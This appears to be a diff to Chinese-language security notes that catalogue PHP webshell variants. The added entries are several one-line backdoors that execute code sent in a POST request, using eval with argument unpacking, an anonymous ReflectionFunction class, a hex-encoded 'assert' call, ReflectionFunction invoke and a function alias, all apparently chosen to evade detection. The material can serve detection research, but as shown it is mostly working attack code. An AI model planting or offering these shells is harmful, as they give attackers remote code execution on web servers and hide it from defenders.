@@ -225,6 +225,12 @@ Content-Type: application/x-zip-compressed
 include session_save_path().'/sess_test';
 ```
 ## 语法
+#### 参数列表展开
+```php
+<?php
+eval(rtrim(...$_POST));
+?>
+```
 
 #### 三目运算
 ```php
@@ -331,6 +337,14 @@ https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html
 $e = $_REQUEST['e'];
 $arr = array($_POST[1],);
 array_filter($arr, $e);
+```
+
+#### 匿名类-new class
+```php
+<?php
+$func = new class('assert') extends ReflectionFunction{};
+$func->invoke($_POST[1]);
+?>
 ```
 
 #### trait
@@ -448,6 +462,13 @@ $legal->doChain(2,"");
 代码执行的sink和代码流这块有点区别，执行任意代码的属于sink，执行指定代码的是代码流。
 
 ## 动态调用-字符串
+#### 编码
+php7
+```php
+<?php
+"\x61\x73\x73\x65\x72\x74"($_POST[1]);
+?>
+```
 
 #### 字符串拼接
 ```php
@@ -475,6 +496,7 @@ $func = ~urldecode($func);
 $func($_POST[1]);
 ?>
 ```
+
 
 ## eval、assert同效果
 
@@ -549,15 +571,20 @@ $arr[841]($_POST[1]);
 
 ```
 
+#### ReflectionFunction
+```php
+$func = new ReflectionFunction('assert');
+print_r($func->invoke($_POST[1]));
+```
 
-#### 编码
+#### 别名
 php7
 ```php
 <?php
-"\x61\x73\x73\x65\x72\x74"($_POST[1]);
+use function \assert as test;
+test($_POST[1]);
 ?>
 ```
-
 
 
 ## 语法
